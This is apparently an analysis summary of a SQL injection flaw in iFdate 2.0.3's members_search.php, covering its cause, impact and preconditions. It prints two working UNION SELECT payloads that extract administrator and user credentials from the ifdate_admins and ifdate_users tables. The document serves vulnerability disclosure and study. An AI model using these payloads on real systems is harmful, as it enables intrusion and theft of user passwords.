Based on the provided content, here's a breakdown of the vulnerability:

*   **Root Cause:** The vulnerability is due to a lack of proper input sanitization in the `members_search.php` script of iFdate version 2.0.3, allowing for SQL injection.
*   **Weaknesses/Vulnerabilities:** The primary weakness is a SQL injection vulnerability, stemming from unsanitized user-controlled input being directly used in SQL queries.
*   **Impact of Exploitation:** An attacker can exploit this vulnerability to gain unauthorized access to the database, potentially allowing them to:
    *   Retrieve sensitive information (e.g., usernames, passwords).
    *   Modify or delete data within the database.
    *   Potentially gain further access to the application or server.
*   **Attack Vectors:** The attack vector is through the `members_search.php` script, specifically the search functionality that takes user input.
*   **Required Attacker Capabilities/Position:**
    *   The attacker must be able to access the `members_search.php` page. The content mentions that the user must be authenticated to access this page.
    *   The attacker must be able to inject SQL code into the search input field.
    *   The application's `magic_quotes_gpc` setting must be disabled (Off), which is a prerequisite.

**Exploits:**

The content provides two specific SQL injection exploits:

*   **Exploit 1:** `' union select 1,concat_ws(0x3a,admin_username,admin_password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58 from ifdate_admins/*`  This exploit aims to retrieve the administrator's username and password from the `ifdate_admins` table.
*   **Exploit 2:** `' union select 1,concat_ws(0x3a,username,password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58 from ifdate_users/*` This exploit aims to retrieve usernames and passwords from the `ifdate_users` table.
